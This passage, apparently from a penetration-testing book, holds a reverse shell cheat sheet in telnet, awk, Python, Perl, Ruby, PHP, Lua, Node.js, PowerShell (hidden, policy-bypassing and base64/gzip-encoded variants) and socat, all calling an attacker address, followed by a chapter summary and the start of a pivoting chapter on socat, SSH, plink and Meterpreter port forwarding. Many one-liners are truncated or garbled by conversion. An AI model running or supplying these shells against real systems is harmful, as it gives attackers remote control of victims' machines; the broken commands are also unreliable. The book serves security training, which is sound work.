# Telnet reverse shell
> Attacker machine (two listeners):
>
> **nc -lv 8080**
>
> **nc -lv 8081 Victim**
>
> **telnet 192.168.2.6 8080 \| /bin/bash \| telnet 192.168.2.6 8081**
>
> Commands will be executed on port 8080 and the output of those
> commands will be printed to port 8081 on the attacker\'s machine.
# awk reverse shell
> **awk \'BEGIN{s=\"/inet/tcp/0/192.168.2.6/8080\";for(;s\|&getline
> c;close(c))while(c\|getline)p**
# R reverse shell
> **R -e
> \"s\ TCP-based Python reverse shell:
>
> **python -c \'import
> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC**
>
> UDP-based Python reverse shell:
>
> **python -c \'import
> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC**
>
> Base64 encoded:
>
> **python -c
> \"exec(\'aW1wb3J0IHNvY2tldCAgICAsc3VicHJvY2VzcyAgICAsb3MgICAgIDtob3N0PSI**
# Perl reverse shell
> TCP-based perl reverse shell (/bin/sh dependent):
>
> **perl -e \'use
> Socket;\$i=\"192.168.2.6\";\$p=8080;socket(S,PF_INET,SOCK_STREAM,getpro**
>
> UDP-based perl reverse shell (/bin/sh dependent):
>
> **perl -e \'use
> Socket;\$i=\"192.168.0.106\";\$p=8080;socket(S,PF_INET,SOCK_DGRAM,getpr**
>
> Without using \'/bin/sh\':
>
> **perl -MIO -e \'\$p=fork;exit,if(\$p);\$c=new
> IO::Socket::INET(PeerAddr,\"192.168.**
>
> For Windows:
>
> **perl -MIO -e \"\$c=new
> IO::Socket::INET(PeerAddr,\'192.168.2.6:8080\');STDIN-\>fdopen**
# Ruby reverse shell
> **ruby -rsocket -e \'exit if
> fork;c=TCPSocket.new(\"192.168.2.6\",\"8080\");while(cmd=c.gets);I**
>
> Or,
>
> **ruby -rsocket -e
> \"c=TCPSocket.new(\'192.168.0.106\',\'8080\');while(cmd=c.gets);IO.popen(cmd**
>
> /bin/sh independent:
>
> **ruby -rsocket -e\'f=TCPSocket.open(\"192.168.2.6\",8080).to_i;exec
> sprintf(\"/bin/sh -i \ Using the exec() function:
>
> **php -r \'\$s=fsockopen(\"192.168.2.6\",8080);exec(\"/bin/sh -i \ \>&3 2\>&3\");\'**
>
> Using the shell_exec() function:
>
> **php -r \'\$s=fsockopen(\"192.168.2.6\",8080);shell_exec(\"/bin/sh -i
> \&3 2\>&3\");\'**
>
> Using the system() function:
>
> **php -r \'\$s=fsockopen(\"192.168.2.6\",8080);system(\"/bin/sh -i
> \&3 2\>&3\");\'**
>
> Using the popen() function:
>
> **php -r \'\$s=fsockopen(\"192.168.2.6\",8080);popen(\"/bin/sh -i \ \>&3 2\>&3\",\"r\");\'**
>
> Using just /bin/sh:
>
> **php -r \'\$s=fsockopen(\"192.168.2.6\",8080);\`/bin/sh -i \&3
> 2\>&3\`;\'**
# Lua reverse shell
> **lua -e \"local s=require(\'socket\');local
> t=assert(s.tcp());t:connect(\'192.168.2.6\',8080);**
>
> []{#_bookmark140 .anchor}\nodejs -e \'(function(){ var
> require = global.require \|\|
> global.process.mainModule.constructor.\_load; if (!require) return;
> var cmd = (global.process.platform.match(/\^win/i)) ? \"cmd\" :
> \"/bin/sh\"; var net = require(\"net\"), cp =
> require(\"child_process\"), util = require(\"util\"), sh =
> cp.spawn(cmd, \[\]); var client = this; var counter=0; function
> StagerRepeat(){ client.socket = net.connect(8080, \"192.168.2.6\",
> function() { client.socket.pipe(sh.stdin); if (typeof util.pump ===
> \"undefined\") { sh.stdout.pipe(client.socket);
> sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout,
> client.socket); util.pump(sh.stderr, client.socket); } });
> socket.on(\"error\", function(error) { counter++; if(counter\ setTimeout(function() { StagerRepeat();}, 5\*1000); } else
> process.exit(); }); } StagerRepeat(); })();\'\
\node -e
\'eval(\"\\x20\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x20\\x76\\x61\\x72
> []{#_bookmark141 .anchor}\powershell -w hidden -nop -c
> function RSC{if (\$c.Connected -eq \$true)
>
> {\$c.Close()};if (\$p.ExitCode -ne \$null)
>
> {\$p.Close()};exit;};\$a=\'192.168.2.6\';\$p=\'8080\';\$c=New-Object
> system.net.sockets.tcpclient;\$c.connect(\$a,\$p);\$s=\$c.GetStream();\$nb=New-
> Object System.Byte\[\] \$c.ReceiveBufferSize;\$p=New-Object
> System.Diagnostics.Process;\$p.StartInfo.FileName=\'cmd.exe\';\$p.StartInfo.Redir
> Sleep 1;\$e=new-object System.Text.AsciiEncoding;while(\$os.Peek() -ne
> -1){\$o
+=
> \$e.GetString(\$os.Read())};\$s.Write(\$e.GetBytes(\$o),0,\$o.Length);\$o=\$null;\$d=
> (-not \$d) {if (\$c.Connected -ne \$true) {RSC};\$pos=0;\$i=1; while
> ((\$i -gt 0) -and (\$pos -lt \$nb.Length))
> {\$r=\$s.Read(\$nb,\$pos,\$nb.Length - \$pos);\$pos+=\$r;if (- not
> \$pos -or \$pos -eq 0) {RSC};if (\$nb\[0..\$(\$pos-1)\] -contains 10)
> {break}};if (\$pos -gt
> 0){\$str=\$e.GetString(\$nb,0,\$pos);\$is.write(\$str);start-sleep
> 1;if (\$p.ExitCode -ne \$null)
{RSC}else{\$o=\$e.GetString(\$os.Read());while(\$os.Peek() -ne -1){\$o
+=
\$e.GetString(\$os.Read());if (\$o -eq \$str)
{\$o=\'\'}};\$s.Write(\$e.GetBytes(\$o),0,\$o.length);\$o=\$null;\$str=\$null}}else{RSC}
\
> \powershell.exe -nop -w hidden -noni -ep bypass \"&
> (\[scriptblock\]::create((New-Object IO.StreamReader(New-Object
> IO.Compression.GzipStream((New-Object IO.MemoryStream(,
> \[Convert\]::FromBase64String(\'H4sIAG6iVVsCA51WXW/bNhR996+4cLVaQix
> \[IO.Compression.CompressionMode\]::Decompress))).ReadToEnd()))\"\
# Socat reverse shell over TCP
> **socat tcp-connect:192.168.2.6:8000 exec:\'bash -li\',pty,stderr,sane
> 2\>&1\>/dev/null &**
# Socat reverse shell over UDP
> **socat udp-connect:192.168.2.6:8000 exec:\'bash -li\',pty,stderr,sane
> 2\>&1\>/dev/null &**
>
> []{#_bookmark144 .anchor}\socat exec:\'bash
> -li\',pty,stderr,setsid,sigint,sane openssl-
> connect:192.168.2.6:8000,key=\$HOME/cert.pem,verify=0\
We hope you now understand the criticality of using a reverse_tcp
payload without any security. In the next chapter, you will be learning
about Empire, the tool that is juiced up with PowerShell modules to get
you better access to your target server.
# Summary
> At the beginning of this chapter, we explored what a reverse
> connection and reverse shell connection is using tools such as netcat,
> ncat, openssl, socat, cryptcat, and powercat. We then tried different
> payloads to get reverse shell connections using
> Metasploit---reverse_tcp, reverse_tcp_rc4, and reverse_https. We then
> saw the enhanced version of reverse_https by using a custom SSL
> certificate with an impersonation technique, a meterpreter hijacking
> case scenario, paranoid mode, and by getting a meterpreter session
> over ngrok. Finally, we provided you with a cheat sheet that you can
> refer to whenever you want a reverse shell.
# Questions
1.  Is it absolutely necessary to understand the concept of reverse
    > shell connections?
2.  Is it required for us to get a reverse shell over an encrypted
    > channel?
3.  Are there any GUI tools that can be used to generate Metasploit
    > payloads?
4.  Can we get Cryptcat for Windows?
5.  Can we use a different stage encoder other than shikata_ga_nai?
6.  Can we use paranoid mode in our red-team operations?
7.  Is ngrok free to use?
# Further reading
> For more information on the topics discussed in this chapter, please
> visit the following
>
> links:
>
> **Reverse connection**:
> 
>
> **Reverse Shell cheat sheet**: 
>
> **InfoSec Resources**:
> 
>
> **The GNU Netcat**:  **Ncat Users\'
> Guide**:  **Powercat**:
>  **CryptCat Project**:
>  **socat**:
> 
>
> **metasploit-framework**:
> [https://github.com/rapid7/metasploit-framework/wiki/How-
> to-use-a-reverse-shell-in-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
>
> **Meterpreter**:
> [https://blog.rapid7.com/2011/06/29/meterpreter-httphttps-communicati](https://blog.rapid7.com/2011/06/29/meterpreter-httphttps-communication/)
>
> [on/](https://blog.rapid7.com/2011/06/29/meterpreter-httphttps-communication/)
>
> **Meterpreter paranoid
> mode**:[https://github.com/rapid7/metasploit-framework/wik](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)
>
> [i/Meterpreter-Paranoid-Mode](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)
>
> **Meterpreter over Ngrok**:
> [https://zircanavo-abyss.blogspot.com/2017/05/meterpret
> er-over-ngrok.html](https://zircanavo-abyss.blogspot.com/2017/05/meterpreter-over-ngrok.html)
# Pivoting
> Once we have gained access to a system using either a web application
> or service exploitation, our next goal is to gain access to the
> internal network that the system might be connected to. Before we
> explore the details of this, let\'s first try to understand a bit
> about port forwarding. Port forwarding is a method which is used to
> authorize an external device\'s access to an internal network.
>
> This is most commonly used by gamers. For example, imagine you\'re
> playing Counter Strike and you want to play with your friends by
> creating a game server. However, those friends are not on the same
> network as you. To overcome this, you port forward an external port of
> your public IP to your machine\'s local port number:
>
> ![](media/image374.jpeg)
>
> Source:
> https://superuser.com/questions/284051/what-is-port-forwarding-and-what-is-it-used-for
The simplest method of port forwarding is through socat. **Socat** is a
command line-based utility that establishes two bidirectional byte
streams and transfers data between them. It is also sometimes referred
to as netcat on steroids because it has a lot of extra features which
netcat lacks.
> ![](media/image60.png)*Socat can be downloaded from the following
> link: .*
For example, if we want someone to connect to our SSH service running on
port
> 22 from port 8080, we can run the following command on our system:
>
> **socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:22**
>
> The preceding command listens for incoming TCP connections on port
> 8080 and forwards them to local port 22, which is running the SSH
> service.
If we try to SSH onto port 8080 now, we will be able to connect and
login:
> ![](media/image375.jpeg)
Pivoting can be considered a set of techniques which use a currently
exploited system as a network hop in order to clear the path toward
internally connected machines. In simpler terms, we can use port
forwarding to pivot inside the internal network of a compromised host
machine.
> Let\'s look at different ways to pivot inside a network. In this
> chapter, we will cover the following topics:
>
> Pivoting via SSH
>
> Meterpreter port forwarding Pivoting via Armitage
>
> Multi-level pivoting
# Technical requirements
> Metasploit Framework (MSF) PGSQL (Postgres)
>
> Oracle Java 1.7 or latest Armitage
>
> Cobalt Strike
# Pivoting via SSH
> This technique can be used to access the local ports on a machine
> which are not accessible from outside. Also known as SSH port
> forwarding or SSH tunneling, this technique allows us to establish an
> SSH session and then tunnel TCP connections through it.
>
> Let\'s take a look at an example scenario in which we have SSH access
> to a Linux system. This system has a VNC service running on the
> machine locally, but is
not visible or accessible from outside the network/system. By performing
netstat on the machine, we can see that the machine has a VNC service
running on port
> 5901:
>
> ![](media/image376.jpeg)
>
> However, by running an nmap scan from outside, we can see that the
> port is not open:
>
> ![](media/image377.jpeg)
>
> This is where SSH pivoting comes into use. We can use the following
> command on our system to forward the port of the remote system onto
> our system using the SSH tunnel: **ssh -L \:\ IP\>:\ user@remotehost**
>
> ![](media/image378.jpeg)
As we can see from the preceding screenshot, the command completed
successfully. We can now run another nmap scan on our local machine to
see that the port is now open:
> ![](media/image379.jpeg)
>
> Since port 5901 is used for VNC, we can now connect to our local port
> 5901 using any VNC client, as shown in the following screenshot:
>
> ![](media/image380.jpeg)
>
> Furthermore, we will have a new window open with the VNC connection,
> as follows:
>
> ![](media/image381.jpeg)
VNC is just one example of how we can pivot using SSH. This can also be
used for any other service running on any port inside the network. The
command will then become the following: **ssh -L \:\:\
user@\**
Wherein:
> a is the local port to which we want the port to be forwarded on our
> machine
>
> b is the IP address of the machine inside the network
>
> c is the port number of machine b, which we want to access
>
> d is the IP of the machine inside the network to which we already have
> SSH access
Pivoting via SSH only works if we have an SSH connection to a host in
the network. However, what if the OS that\'s installed is Windows? How
do we do perform an SSH port forward in that case?
> The answer to this is through **PuTTY Link** (**Plink**). Plink is a
> command-line connection tool similar to UNIX SSH. We can upload the
> plink.exe file onto a Windows machine and use the same command that we
> used previously to perform SSH port forwarding: **plink -R
> \:\:\**
>
> **user@\**
>
> Plink can be downloaded from the following URL:
> [https://www.chiark.greenend.org.
> uk/\~sgtatham/putty/latest.html.](https://www.chiark.greenend.org.uk/%7Esgtatham/putty/latest.html)
For more information on SSH, visit the following links:
> [https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-
> the-difference-between-ssh-local-and-remot](https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot)
> [http://the.earth.li/\~sgtatham/putty/0.52/htmldoc/Chapter7.html](http://the.earth.li/%7Esgtatham/putty/0.52/htmldoc/Chapter7.html)
# Meterpreter port forwarding
> Meterpreter also has a built-in feature which allows direct access to
> the systems/services inside the network which are otherwise
> unreachable. The main difference between this and SSH tunneling is
> that SSH tunneling uses RSA encryption, whereas Meterpreter port
> forwarding happens over TLS.
>
> Let\'s look at an example of port forwarding using Meterpreter. The
> command used for port forwarding using Meterpreter is portfwd. To view
> the options of the command, you can type portfwd \--help into
> Meterpreter: